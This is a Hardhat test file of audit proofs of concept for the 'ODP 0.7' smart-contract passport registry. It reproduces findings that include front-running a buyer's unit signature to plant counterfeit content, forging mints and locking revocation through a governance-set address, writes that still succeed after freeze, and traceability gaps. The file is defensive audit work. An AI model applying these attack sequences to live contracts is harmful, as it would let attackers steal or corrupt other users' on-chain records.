/**
 * @file ODP 0.7 pre-release audit — proofs of concept, part 2.
 *
 * Same contract as part 1: every test asserts TODAY'S behaviour at commit d9e656e.
 * A green run means the finding reproduces.
 *
 * Run:  cd chain && npx hardhat test deploy/test/ODPAudit07b.poc.test.js
 */
import { expect } from "chai";
import { network } from "hardhat";
import crypto from "node:crypto";

const { ethers } = await network.connect();

const TYPE_C = "0x43";
const TYPE_B = "0x42";
const MINT_SELF = "";
const PHYS_MIN = 1 | 2 | 4 | 8;
const ANCHOR_UNIT_KEY_SET = 4096;
const LIB_KEY = "project/contracts/ODPPassportLib.sol:ODPPassportLib";

function h(p, n) { return ethers.keccak256(ethers.toUtf8Bytes(`${p}:${n}`)); }

async function ym() {
  const b = await ethers.provider.getBlock("latest");
  const d = new Date(b.timestamp * 1000);
  return { year: d.getUTCFullYear(), month: d.getUTCMonth() + 1 };
}

async function physicalInputs(n, overrides = {}) {
  const { year, month } = await ym();
  return {
    core: {
      year, month,
      title: "Genuine work", authorName: "Genuine Author",
      shortDescription: "A real object", domain: "art",
      contentClass: 1, lifecycleStatus: 3, aiStatus: 1,
      verificationMethod: 1, editionModel: 1,
      ...(overrides.core || {}),
    },
    dataHash: h("data", n), dataUrl: "",
    imageHash: h("image", n), imageUrl: "",
    fileHash: ethers.ZeroHash, anchorsHash: h("anchors", n),
    anchorTypesMask: PHYS_MIN, initialOwner: ethers.ZeroAddress,
    ...Object.fromEntries(Object.entries(overrides).filter(([k]) => k !== "core")),
  };
}

async function deployRegistry() {
  const lib = await (await ethers.getContractFactory("ODPPassportLib")).deploy();
  await lib.waitForDeployment();
  const reg = await (await ethers.getContractFactory("ObjectDigitalPassport", {
    libraries: { [LIB_KEY]: await lib.getAddress() },
  })).deploy();
  await reg.waitForDeployment();
  return reg;
}

async function lastPassportOf(reg, w) {
  const [ids] = await reg.getPassportsByCreatorPaged(w, 0, 200);
  return ids[ids.length - 1];
}

function sha256(...parts) {
  const d = crypto.createHash("sha256");
  for (const p of parts) d.update(Buffer.from(ethers.getBytes(p)));
  return "0x" + d.digest("hex");
}
function unitLeaf(i, a) { return sha256(ethers.zeroPadValue(ethers.toBeHex(i), 4), a); }
function buildTree(leaves) {
  const levels = [leaves]; let level = leaves;
  while (level.length > 1) {
    const next = [];
    for (let i = 0; i < level.length; i += 2) next.push(sha256(level[i], i + 1 < level.length ? level[i + 1] : level[i]));
    levels.push(next); level = next;
  }
  return { root: level[0], levels };
}
function proofFor(levels, index) {
  const proof = []; let idx = index;
  for (let d = 0; d < levels.length - 1; d++) {
    const lv = levels[d];
    proof.push(lv[(idx & 1) === 0 ? Math.min(idx + 1, lv.length - 1) : idx - 1]);
    idx >>= 1;
  }
  return proof;
}

describe("ODP 0.7 audit PoC (part 2)", function () {
  // ── H. Front-running a unit-key signature ──────────────────────────────────
  it("H1: a watcher copies the unit signature from the mempool and locks the buyer out of their own unit forever", async function () {
    const reg = await deployRegistry();
    const units = await (await ethers.getContractFactory("ODPEditionUnits")).deploy(reg.target);
    await units.waitForDeployment();
    await (await reg.setEditionUnits(units.target)).wait();

    const [, brand, buyer, frontrunner] = await ethers.getSigners();
    await (await reg.connect(brand).registerCreator(TYPE_B)).wait();
    await (await reg.connect(brand).mintPhysical(
      await physicalInputs(1, { anchorTypesMask: PHYS_MIN | ANCHOR_UNIT_KEY_SET }), false, MINT_SELF)).wait();
    const editionId = await lastPassportOf(reg, brand.address);

    const keys = [0, 1].map((i) => new ethers.Wallet(ethers.keccak256(ethers.toUtf8Bytes(`k${i}`))));
    const { root, levels } = buildTree(keys.map((w, i) => unitLeaf(i, w.address)));
    await (await units.connect(brand).openEdition(editionId, root, 2, ethers.ZeroAddress)).wait();

    const idx = 0;
    const proof = proofFor(levels, idx);
    await (await units.connect(buyer).activate(editionId, idx, proof,
      await keys[idx].signMessage(ethers.getBytes(await units.activationPayloadHash(editionId, idx))))).wait();

    // The buyer signs with the printed unit key, naming THEMSELVES as owner, and broadcasts.
    const buyerSig = await keys[idx].signMessage(
      ethers.getBytes(await units.mintPayloadHash(editionId, idx, buyer.address)));
    const honest = await physicalInputs(2, { core: { title: "Unit 0 — as the brand described it" } });

    // The signature is public the moment it is in the mempool. It authorizes exactly
    // (edition, unitIndex, buyer) and says nothing about the card, so anyone may replay it
    // with content of their own — and the replay is what claims the (unit, owner) slot.
    const hostile = await physicalInputs(3, { core: { title: "COUNTERFEIT — planted by a front-runner" } });
    await (await units.connect(frontrunner).mintUnitPassport(
      editionId, idx, buyer.address, proof, buyerSig, hostile, false)).wait();

    // The buyer's own transaction now reverts, permanently: the slot is per (unit, owner).
    await expect(units.connect(buyer).mintUnitPassport(
      editionId, idx, buyer.address, proof, buyerSig, honest, false))
      .to.be.revertedWithCustomError(units, "EC").withArgs(129n);

    // The buyer owns a passport whose card the attacker wrote, attributed to the brand.
    const unitId = (await units.getUnitPassports(editionId, idx))[0];
    const header = await reg.getPassportHeader(unitId);
    expect(header.owner).to.equal(buyer.address);
    expect(header.creator).to.equal(brand.address);
    expect(header.title).to.equal("COUNTERFEIT — planted by a front-runner");
  });

  // ── I. What the editionUnits address really grants ─────────────────────────
  it("I1: whatever address governance names as editionUnits can mint under ANY profile — a plain C artist included", async function () {
    const reg = await deployRegistry();
    const [gov, artist, attacker, victimOfMint] = await ethers.getSigners();

    await (await reg.connect(artist).registerCreator(TYPE_C)).wait();
    await (await reg.connect(artist).mintPhysical(await physicalInputs(10), false, MINT_SELF)).wait();
    const artistPassport = await lastPassportOf(reg, artist.address);
    const artistCreatorId = await reg.getCreatorByWallet(artist.address);

    // No interface check, no code check, no event. An EOA is accepted.
    await (await reg.connect(gov).setEditionUnits(attacker.address)).wait();
    expect(await reg.editionUnits()).to.equal(attacker.address);

    // `editionPassportId` is only required to EXIST and not be revoked. Any passport works,
    // including an ordinary C passport that has nothing to do with editions.
    await (await reg.connect(attacker).mintUnitPassport(
      await physicalInputs(11, { core: { title: "Minted in the artist's name" } }),
      artistPassport, victimOfMint.address, false)).wait();

    const forged = await lastPassportOf(reg, artist.address);
    expect(forged).to.not.equal(artistPassport);
    const header = await reg.getPassportHeader(forged);
    expect(header.creator).to.equal(artist.address);
    expect(header.creatorId).to.equal(artistCreatorId);
    expect(header.title).to.equal("Minted in the artist's name");
    // Monthly caps are not applied on this path at all.
  });

  it("I2: the same address permanently strips ANY passport of its revocation remedy", async function () {
    const reg = await deployRegistry();
    const [gov, artist, attacker] = await ethers.getSigners();

    await (await reg.connect(artist).registerCreator(TYPE_C)).wait();
    await (await reg.connect(artist).mintPhysical(await physicalInputs(20), false, MINT_SELF)).wait();
    const id = await lastPassportOf(reg, artist.address);

    await (await reg.connect(gov).setEditionUnits(attacker.address)).wait();
    await (await reg.connect(attacker).lockEditionRevocation(id)).wait();

    expect(await reg.isRevocationLocked(id)).to.equal(true);
    await expect(reg.connect(artist).revokePassport(id, h("typo", 1)))
      .to.be.revertedWithCustomError(reg, "EC").withArgs(116n);
    await expect(reg.connect(gov).revokePassport(id, h("typo", 2)))
      .to.be.revertedWithCustomError(reg, "EC").withArgs(116n);

    // Un-wiring the satellite afterwards does not undo it — the lock has no reverse.
    await (await reg.connect(gov).setEditionUnits(ethers.ZeroAddress)).wait();
    expect(await reg.isRevocationLocked(id)).to.equal(true);
    await expect(reg.connect(artist).revokePassport(id, h("typo", 3)))
      .to.be.revertedWithCustomError(reg, "EC").withArgs(116n);
  });

  it("I3: governance rewiring and satellite writes survive freeze(), while every user path is shut", async function () {
    const reg = await deployRegistry();
    const [gov, artist, attacker] = await ethers.getSigners();
    await (await reg.connect(artist).registerCreator(TYPE_C)).wait();
    await (await reg.connect(artist).mintPhysical(await physicalInputs(30), false, MINT_SELF)).wait();
    const id = await lastPassportOf(reg, artist.address);

    await (await reg.connect(gov).freeze()).wait();
    expect(await reg.frozen()).to.equal(true);

    // "Once frozen the registry accepts no new writes" — four governance setters still write.
    await (await reg.connect(gov).setEditionUnits(attacker.address)).wait();
    expect(await reg.editionUnits()).to.equal(attacker.address);
    await (await reg.connect(gov).setRelationsSatellite(attacker.address)).wait();
    await (await reg.connect(gov).setExtensionRouter(attacker.address)).wait();
    await (await reg.connect(gov).transferGovernance(attacker.address)).wait();

    // And lockEditionRevocation writes storage on a frozen registry.
    await (await reg.connect(attacker).lockEditionRevocation(id)).wait();
    expect(await reg.isRevocationLocked(id)).to.equal(true);

    // The owner, meanwhile, can do nothing at all.
    await expect(reg.connect(artist).transferPassport(id, attacker.address))
      .to.be.revertedWithCustomError(reg, "EC").withArgs(58n);
  });

  // ── J. Traceability gaps ───────────────────────────────────────────────────
  it("J1: a unit passport carries no on-chain link to the edition it came from", async function () {
    const reg = await deployRegistry();
    const units = await (await ethers.getContractFactory("ODPEditionUnits")).deploy(reg.target);
    await units.waitForDeployment();
    await (await reg.setEditionUnits(units.target)).wait();

    const [, brand, buyer] = await ethers.getSigners();
    await (await reg.connect(brand).registerCreator(TYPE_B)).wait();
    await (await reg.connect(brand).mintPhysical(
      await physicalInputs(40, { anchorTypesMask: PHYS_MIN | ANCHOR_UNIT_KEY_SET }), false, MINT_SELF)).wait();
    const editionId = await lastPassportOf(reg, brand.address);

    const key = new ethers.Wallet(ethers.keccak256(ethers.toUtf8Bytes("k0")));
    const { root, levels } = buildTree([unitLeaf(0, key.address)]);
    await (await units.connect(brand).openEdition(editionId, root, 1, ethers.ZeroAddress)).wait();
    await (await units.connect(buyer).activate(editionId, 0, proofFor(levels, 0),
      await key.signMessage(ethers.getBytes(await units.activationPayloadHash(editionId, 0))))).wait();
    await (await units.connect(buyer).mintUnitPassport(editionId, 0, buyer.address, proofFor(levels, 0),
      await key.signMessage(ethers.getBytes(await units.mintPayloadHash(editionId, 0, buyer.address))),
      await physicalInputs(41), false)).wait();

    const unitId = (await units.getUnitPassports(editionId, 0))[0];

    // Nothing in the registry's own record distinguishes it from a standalone mint.
    const header = await reg.getPassportHeader(unitId);
    const media = await reg.getPassportMedia(unitId);
    const cls = await reg.getPassportClassification(unitId);
    const asText = JSON.stringify([header, media, cls].map((v) => v.toString()));
    expect(asText).to.not.include(editionId);
    // The link exists only in the satellite, and only in the edition→unit direction.
    expect(await units.getUnitPassports(editionId, 0)).to.include(unitId);
  });

  it("J2: PassportUrlsUpdated does not say who changed the URL", async function () {
    const reg = await deployRegistry();
    const [, artist, buyer] = await ethers.getSigners();
    await (await reg.connect(artist).registerCreator(TYPE_C)).wait();
    await (await reg.connect(artist).mintPhysical(
      await physicalInputs(50, { dataUrl: "https://a.example/p.odpass" }), false, MINT_SELF)).wait();
    const id = await lastPassportOf(reg, artist.address);
    await (await reg.connect(artist).transferPassport(id, buyer.address)).wait();

    const dataHash = (await reg.getPassportMedia(id)).dataHash;
    const rc = await (await reg.connect(artist).updatePassportUrls(id, "https://b.example/p.odpass", "", dataHash)).wait();

    const ev = rc.logs.map((l) => { try { return reg.interface.parseLog(l); } catch { return null; } })
      .find((p) => p && p.name === "PassportUrlsUpdated");
    const fields = ev.fragment.inputs.map((i) => i.name);
    expect(fields).to.deep.equal(["passportId", "newDataUrl", "newImageUrl"]);
    // No actor, no timestamp. A reader of the history cannot tell the seller from the owner.
    expect(fields).to.not.include("updatedBy");
    expect(fields).to.not.include("timestamp");
  });

  it("J3: the owner cannot revoke a publishing delegation the creator granted", async function () {
    const reg = await deployRegistry();
    const relations = await (await ethers.getContractFactory("ODPRegistryRelations")).deploy(reg.target);
    await relations.waitForDeployment();
    await (await reg.setRelationsSatellite(relations.target)).wait();

    const [, artist, buyer, agent] = await ethers.getSigners();
    await (await reg.connect(artist).registerCreator(TYPE_C)).wait();
    await (await reg.connect(artist).mintPhysical(await physicalInputs(60), false, MINT_SELF)).wait();
    const id = await lastPassportOf(reg, artist.address);

    const far = (await ethers.provider.getBlock("latest")).timestamp + 100 * 365 * 24 * 3600;
    await (await relations.connect(artist).delegateCreatorPublishing(agent.address, far)).wait();
    await (await reg.connect(artist).transferPassport(id, buyer.address)).wait();

    const dataHash = (await reg.getPassportMedia(id)).dataHash;
    // A third party the buyer never met can re-point the buyer's bundle URL, for a century.
    await (await reg.connect(agent).updatePassportUrls(id, "https://agent.example/x.odpass", "", dataHash)).wait();
    expect((await reg.getPassportMedia(id)).dataUrl).to.equal("https://agent.example/x.odpass");

    // Only the creator can revoke that delegation; the owner has no call for it.
    const [who, exp] = await relations.getCreatorPublishingDelegation(artist.address);
    expect(who).to.equal(agent.address);
    expect(exp).to.equal(BigInt(far));
    expect(relations.interface.fragments.filter((f) => f.type === "function").map((f) => f.name))
      .to.not.include("revokeCreatorPublishingFor");
  });
});
